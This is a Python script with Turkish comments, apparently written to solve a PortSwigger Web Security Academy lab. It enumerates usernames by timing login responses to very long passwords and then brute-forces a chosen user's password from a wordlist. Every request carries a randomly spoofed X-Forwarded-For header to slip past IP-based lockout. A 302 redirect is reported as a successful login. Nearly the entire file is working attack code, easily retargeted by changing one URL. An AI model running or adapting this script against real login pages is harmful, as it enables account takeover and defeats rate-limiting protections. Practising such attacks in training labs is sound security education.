"""
progmı kullanmadan önce labın açıklamasındaki kullanıcı adlarını kopyalayıp programın bulunduğu
konuma users.txt dosyasına kaydedin parolalarıda passwords.txt dosyasına kaydedin.

kullanıcı adı enumeration için "python BForce_and_Enumeration.py -e" kullanın
kullanıcı parolasına brute force yapmak için "python BForce_and_Enumeration.py -u username"
şeklinde bulmuş olduğunuz kullanıcı adını username kısmına yzarak gerçekleştirebilirsiniz
"""

import requests
import time
import random
import sys
import argparse

# Yapılandırma burada kendi labınızın giriş formundaki url adresini yazın
TARGET_URL = "https://0a9800490375fb6981b5dfec00c30097.web-security-academy.net/login"
PASS_FILE = "passwords.txt"
USER_FILE = "users.txt"

def get_random_ip():
    """IP engellemesini aşmak için her istekte farklı bir IP üretir."""
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

def make_request(username, password):
    headers = {
        "Cookie": "session=SdTpgGXwv8RA9w05ivCPqY8mqdB3l4xD", # cookie kısmına size atanmış cookie değerini giriniz
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": get_random_ip()
    }
    
    data = {
        "username": username,
        "password": password
    }

    start_time = time.time()
    # allow_redirects=False sayesinde 302 (başarılı login) yanıtını yakalıyoruz
    try:
        response = requests.post(TARGET_URL, headers=headers, data=data, allow_redirects=False, timeout=10)
        duration = time.time() - start_time
        return response, duration
    except Exception as e:
        print(f"[!] Hata oluştu: {e}")
        return None, 0

def enumerate_users():
    print(f"[*] Kullanıcı tespiti başlatılıyor (Zaman analizi: Uzun şifre metodu)...")
    try:
        with open(USER_FILE, "r") as f:
            users = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[!] {USER_FILE} bulunamadı!")
        return

    for user in users:
        # Uzun şifre göndererek hash süresini uzatıyoruz (Enumeration saldırısı)
        resp, duration = make_request(user, "a" * 2000)
        if resp:
            print(f"[?] Deneniyor: {user:15} | Süre: {duration:.4f}s | Durum: {resp.status_code}")
            # Yanıt süresi 0.5 saniyeden uzunsa muhtemelen kullanıcı doğrudur
            if duration > 2:
                print(f"\n[!] POTANSİYEL KULLANICI BULUNDU: {user}\n")

def brute_force(target_user):
    print(f"[*] '{target_user}' kullanıcısı için Brute Force başlatılıyor...")
    try:
        with open(PASS_FILE, "r") as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[!] {PASS_FILE} bulunamadı!")
        return

    for password in passwords:
        resp, duration = make_request(target_user, password)
        
        if resp:
            # 302 Redirect genellikle başarılı girişi temsil eder
            if resp.status_code == 302:
                print(f"\n[+]" + "="*40)
                print(f"[+] BAŞARILI GİRİŞ!")
                print(f"[+] Kullanıcı: {target_user}")
                print(f"[+] Parola:    {password}")
                print(f"[+]" + "="*40)
                return
            else:
                print(f"[-] Deneniyor: {password:20} | Durum: {resp.status_code} | IP: {resp.request.headers['X-Forwarded-For']}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PortSwigger Lab Brute Force & Enumeration Tool")
    parser.add_argument("-e", "--enumerate", action="store_true", help="Kullanıcı listesi ile zaman analizi yapar")
    parser.add_argument("-u", "--user", type=str, help="Brute force yapılacak hedef kullanıcı adı")
    
    args = parser.parse_args()

    if args.enumerate:
        enumerate_users()
    elif args.user:
        brute_force(args.user)
    else:
        parser.print_help()